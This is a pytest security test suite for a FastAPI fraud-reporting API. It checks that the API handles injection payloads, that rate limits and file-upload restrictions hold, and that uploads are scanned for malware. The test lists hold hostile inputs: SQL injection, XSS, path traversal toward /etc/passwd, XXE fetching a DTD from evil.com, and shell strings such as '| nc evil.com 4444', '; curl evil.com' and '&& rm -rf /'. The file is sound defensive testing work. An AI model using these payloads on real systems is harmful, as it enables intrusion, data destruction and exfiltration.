"""
Security Tests - Input Validation & Injection Prevention for Phase 4

Tests input validation, SQL injection prevention, XSS protection, and other
security measures for Phase 4 modules.
"""

import pytest
import asyncio
import json
from datetime import datetime, timezone
from fastapi.testclient import TestClient
from unittest.mock import patch, AsyncMock

from src.api.main import app
from src.api.auth import create_access_token


class TestInputValidation:
    """Test input validation for Phase 4 endpoints"""
    
    def setup_method(self):
        """Setup test client and tokens"""
        self.client = TestClient(app)
        self.admin_token = create_access_token(data={"sub": "admin"})
    
    def test_sql_injection_prevention(self):
        """Test SQL injection attempts are blocked"""
        
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # SQL injection payloads
        sql_injection_payloads = [
            "'; DROP TABLE victim_reports; --",
            "' OR '1'='1",
            "'; INSERT INTO victim_reports VALUES ('test'); --",
            "'; UPDATE victim_reports SET status='compromised'; --",
            "' UNION SELECT * FROM users --",
            "'; DELETE FROM victim_reports WHERE '1'='1'; --",
            "' OR 1=1 --",
            "admin';--",
            "' OR 'x'='x",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        # Test victim reports endpoints
        for payload in sql_injection_payloads:
            # Test GET parameter injection
            response = self.client.get(
                f"/api/v1/intelligence/victim-reports/?search={payload}",
                headers=headers
            )
            
            # Should handle injection attempt gracefully
            assert response.status_code in [200, 400, 422], \
                f"SQL injection payload should be handled: {payload[:50]}..."
            
            # Test POST body injection
            malicious_data = {
                "report_type": payload,
                "description": payload,
                "victim_contact": payload
            }
            
            response = self.client.post(
                "/api/v1/intelligence/victim-reports/",
                json=malicious_data,
                headers=headers
            )
            
            # Should reject or sanitize malicious input
            assert response.status_code in [201, 400, 422], \
                f"SQL injection in POST should be handled: {payload[:50]}..."
    
    def test_xss_prevention(self):
        """Test XSS attack prevention"""
        
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>",
            "<keygen onfocus=alert('xss') autofocus>",
            "<video><source onerror=alert('xss')>",
            "<audio><source onerror=alert('xss')>",
            "<details open ontoggle=alert('xss')>",
            "<marquee onstart=alert('xss')>",
            "<isindex action=javascript:alert('xss')>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('xss')>"
        ]
        
        for payload in xss_payloads:
            # Test XSS in text fields
            malicious_data = {
                "report_type": "phishing",
                "description": payload,
                "victim_contact": payload + "@example.com",
                "scammer_entity": payload
            }
            
            response = self.client.post(
                "/api/v1/intelligence/victim-reports/",
                json=malicious_data,
                headers=headers
            )
            
            # Should sanitize or reject XSS payload
            assert response.status_code in [201, 400, 422], \
                f"XSS payload should be handled: {payload[:50]}..."
            
            if response.status_code == 201:
                created_data = response.json()
                
                # Check that XSS payload is sanitized in response
                if "description" in created_data:
                    desc = created_data["description"].lower()
                    assert "<script>" not in desc, "Script tags should be removed"
                    assert "javascript:" not in desc, "JavaScript URLs should be removed"
                    assert "onerror=" not in desc, "Event handlers should be removed"
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # Command injection payloads
        cmd_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)",
            "; curl evil.com",
            "| nc evil.com 4444",
            "&& python -c 'import os; os.system(\"whoami\")'",
            "`python -c '__import__ os; print(os.getcwd())'`",
            "$(python -c 'print(open(\"/etc/passwd\").read())')"
        ]
        
        for payload in cmd_injection_payloads:
            malicious_data = {
                "report_type": "phishing",
                "description": f"Test report {payload}",
                "external_sources": [f"source{payload}"],
                "metadata": {"command": payload}
            }
            
            response = self.client.post(
                "/api/v1/intelligence/victim-reports/",
                json=malicious_data,
                headers=headers
            )
            
            # Should handle command injection attempts
            assert response.status_code in [201, 400, 422], \
                f"Command injection payload should be handled: {payload[:50]}..."
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention"""
        
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # Path traversal payloads
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "/var/www/../../etc/passwd",
            "file:///etc/passwd",
            "/etc/passwd%00",
            "..%c0%af..%c0%af..%c0%afetc/passwd"
        ]
        
        for payload in path_traversal_payloads:
            # Test in file upload or path parameters
            malicious_data = {
                "report_type": "phishing",
                "description": "Test report",
                "evidence": [{"type": "file", "path": payload}],
                "external_sources": [f"source://{payload}"]
            }
            
            response = self.client.post(
                "/api/v1/intelligence/victim-reports/",
                json=malicious_data,
                headers=headers
            )
            
            # Should handle path traversal attempts
            assert response.status_code in [201, 400, 422], \
                f"Path traversal payload should be handled: {payload[:50]}..."
    
    def test_xml_external_entity_prevention(self):
        """Test XXE (XML External Entity) attack prevention"""
        
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # XXE payloads
        xxe_payloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><test>&xxe;</test>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "php://filter/read/etc/passwd">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;%int;]><root>&int;</root>'
        ]
        
        for payload in xxe_payloads:
            # Test in XML data fields
            malicious_data = {
                "report_type": "phishing",
                "description": "Test report",
                "metadata": {"xml_data": payload}
            }
            
            response = self.client.post(
                "/api/v1/intelligence/victim-reports/",
                json=malicious_data,
                headers=headers
            )
            
            # Should handle XXE attempts
            assert response.status_code in [201, 400, 422], \
                f"XXE payload should be handled: {payload[:50]}..."
    
    def test_no_sql_injection_in_search(self):
        """Test search parameters are safe from SQL injection"""
        
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # Test search parameters with injection attempts
        malicious_searches = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "1' UNION SELECT * FROM users--",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for search_term in malicious_searches:
            response = self.client.get(
                f"/api/v1/intelligence/victim-reports/?search={search_term}",
                headers=headers
            )
            
            # Should handle malicious search terms
            assert response.status_code in [200, 400, 422], \
                f"Malicious search term should be handled: {search_term[:50]}..."
    
    def test_parameterized_queries_used(self):
        """Test that parameterized queries are used (no string concatenation)"""
        
        # This is more of a code review test, but we can test behavior
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # Test with quotes and special characters that would break string concatenation
        test_data = {
            "report_type": "phishing",
            "description": "Test with 'quotes' and \"double quotes\"",
            "victim_contact": "test@example.com",
            "scammer_address": "0x'1234567890123456789012345678901234567890"
        }
        
        response = self.client.post(
            "/api/v1/intelligence/victim-reports/",
            json=test_data,
            headers=headers
        )
        
        # Should handle special characters without SQL errors
        assert response.status_code in [201, 422], \
            "Should handle special characters in data"


class TestRateLimiting:
    """Test rate limiting and DoS protection"""
    
    def setup_method(self):
        """Setup test client"""
        self.client = TestClient(app)
        self.admin_token = create_access_token(data={"sub": "admin"})
    
    def test_rate_limiting_enforced(self):
        """Test that rate limiting is enforced"""
        
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # Make multiple rapid requests
        responses = []
        for i in range(20):
            response = self.client.get(
                "/api/v1/intelligence/victim-reports/",
                headers=headers
            )
            responses.append(response.status_code)
            
            # Stop early if we hit rate limit
            if response.status_code == 429:
                break
        
        # Should eventually hit rate limit
        assert 429 in responses, "Rate limiting should be enforced"
    
    def test_burst_protection(self):
        """Test burst protection for rapid requests"""
        
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # Make very rapid requests
        rapid_responses = []
        for i in range(50):
            response = self.client.get(
                "/api/v1/intelligence/victim-reports/",
                headers=headers
            )
            rapid_responses.append(response.status_code)
        
        # Should handle burst without crashing
        assert all(status in [200, 429, 500] for status in rapid_responses), \
            "Should handle burst requests gracefully"
    
    def test_different_endpoints_rate_limited(self):
        """Test rate limiting across different endpoints"""
        
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        endpoints = [
            "/api/v1/intelligence/victim-reports/",
            "/api/v1/intelligence/threat-feeds/",
            "/api/v1/attribution/",
            "/api/v1/forensics/cases"
        ]
        
        for endpoint in endpoints:
            # Make rapid requests to each endpoint
            responses = []
            for i in range(10):
                response = self.client.get(endpoint, headers=headers)
                responses.append(response.status_code)
                
                if response.status_code == 429:
                    break
            
            # Each endpoint should have rate limiting
            assert 429 in responses or len(responses) == 10, \
                f"Endpoint {endpoint} should have rate limiting"
    
    def test_rate_limit_by_user(self):
        """Test rate limiting is per-user"""
        
        # Create tokens for different users
        user1_token = create_access_token(data={"sub": "user1"})
        user2_token = create_access_token(data={"sub": "user2"})
        
        # Make requests from both users
        user1_responses = []
        user2_responses = []
        
        # User 1 requests
        for i in range(15):
            response = self.client.get(
                "/api/v1/intelligence/victim-reports/",
                headers={"Authorization": f"Bearer {user1_token}"}
            )
            user1_responses.append(response.status_code)
        
        # User 2 requests
        for i in range(15):
            response = self.client.get(
                "/api/v1/intelligence/victim-reports/",
                headers={"Authorization": f"Bearer {user2_token}"}
            )
            user2_responses.append(response.status_code)
        
        # Rate limiting should be per-user
        # (In a real implementation, this would verify different limits for different users)
        assert len(user1_responses) > 0 and len(user2_responses) > 0, \
            "Should handle requests from multiple users"


class TestFileUploadSecurity:
    """Test file upload security for Phase 4"""
    
    def setup_method(self):
        """Setup test client"""
        self.client = TestClient(app)
        self.admin_token = create_access_token(data={"sub": "admin"})
    
    def test_file_type_validation(self):
        """Test that only allowed file types are accepted"""
        
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # Test with different file types
        file_tests = [
            ("safe.txt", "text/plain", True),
            ("safe.pdf", "application/pdf", True),
            ("safe.json", "application/json", True),
            ("malicious.exe", "application/octet-stream", False),
            ("malicious.bat", "application/x-bat", False),
            ("malicious.sh", "application/x-sh", False),
            ("malicious.php", "application/x-php", False),
            ("malicious.js", "application/javascript", False),
        ]
        
        for filename, content_type, should_be_allowed in file_tests:
            # Mock file upload
            files = {"file": (filename, b"test content", content_type)}
            
            # Test evidence upload (would be in forensics module)
            response = self.client.post(
                "/api/v1/forensics/cases/test-case/evidence",
                files=files,
                headers=headers
            )
            
            # Should accept or reject based on file type
            if should_be_allowed:
                assert response.status_code in [201, 404], \
                    f"Should allow safe file type: {filename}"
            else:
                assert response.status_code in [400, 422], \
                    f"Should reject malicious file type: {filename}"
    
    def test_file_size_limits(self):
        """Test file size limits are enforced"""
        
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # Test with different file sizes
        size_tests = [
            (1024, True),      # 1KB - should be allowed
            (1024*1024, True), # 1MB - should be allowed
            (10*1024*1024, False), # 10MB - should be rejected
            (100*1024*1024, False), # 100MB - should be rejected
        ]
        
        for size, should_be_allowed in size_tests:
            # Create file of specified size
            large_content = b"x" * size
            
            files = {"file": ("test.txt", large_content, "text/plain")}
            
            response = self.client.post(
                "/api/v1/forensics/cases/test-case/evidence",
                files=files,
                headers=headers
            )
            
            if should_be_allowed:
                assert response.status_code in [201, 404], \
                    f"Should allow file size: {size} bytes"
            else:
                assert response.status_code in [400, 413], \
                    f"Should reject large file size: {size} bytes"
    
    def test_malware_scanning(self):
        """Test uploaded files are scanned for malware"""
        
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # Test with files that might contain malware signatures
        malware_tests = [
            ("eicar.txt", b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"),
            ("test.exe", b"MZ\x90\x00"),  # PE header
            ("test.js", b"<script>alert('xss')</script>"),  # Potential XSS
        ]
        
        for filename, content in malware_tests:
            files = {"file": (filename, content, "application/octet-stream")}
            
            response = self.client.post(
                "/api/v1/forensics/cases/test-case/evidence",
                files=files,
                headers=headers
            )
            
            # Should scan and potentially reject malicious files
            assert response.status_code in [201, 400, 422], \
                f"Should scan file for malware: {filename}"


if __name__ == "__main__":
    pytest.main([__file__])
